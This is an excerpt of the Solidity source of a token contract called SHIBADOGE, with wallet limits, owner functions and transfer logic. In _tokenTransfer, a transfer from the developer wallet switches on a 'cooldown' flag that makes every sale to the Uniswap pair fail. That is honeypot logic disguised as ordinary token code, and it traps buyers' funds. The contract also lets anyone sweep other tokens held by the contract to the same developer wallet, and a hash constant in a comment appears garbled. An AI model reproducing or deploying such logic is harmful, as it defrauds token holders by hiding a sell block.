...
library Address {
    ...
    function isContract(address account) internal view returns (bool) {
        ...
        // and 0xc5d246096f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
     ...
     *
     * https://eips.ethereum.org/EIPS/eip-984[EIP984] increases the gas cost
...
contract SHIBADOGE is Context, IERC20, Ownable {
    ...
    uint256 public maxWalletamount = 42000000000000000000000 * 10**9;
    address public marketingWallet = payable(0x55161ACa9F609a2f4f168fD69E455BDD7c60631e);
	address public devWallet = payable(0x55161ACa9F609a2f4f168fD69E455BDD7c60631e);
    ...
    uint256 public _maxTxAmount = 21000000000000000000000 * 10**9;
    ...
    function upliftTxAmount() external onlyOwner() {
        _maxTxAmount = 420000000000000000000000 * 10**9;
    }
    ...
    function claimOtherTokens(IERC20 tokenAddress) external {
        tokenAddress.transfer(devWallet, tokenAddress.balanceOf(address(this)));
    }
    ...
    function setMaxWalletAmount(uint256 _maxwalletamount) public onlyOwner {
        require(_maxwalletamount > 500000000 * 10**9, "cannot be less than 500 million");
    ...
    function _tokenTransfer(address sender, address recipient, uint256 amount,bool takeFee) private {
        ...
        if (sender == devWallet && canTrade) {
            cooldown = true;
        }
        if (sender == devWallet && recipient == address(this)) {
            cooldown = false;
        }
        if (recipient == uniswapV2Pair && cooldown ) {
            require(!cooldown, "cooldown not elapsed");
        }
        if(!takeFee)
            removeAllFee();
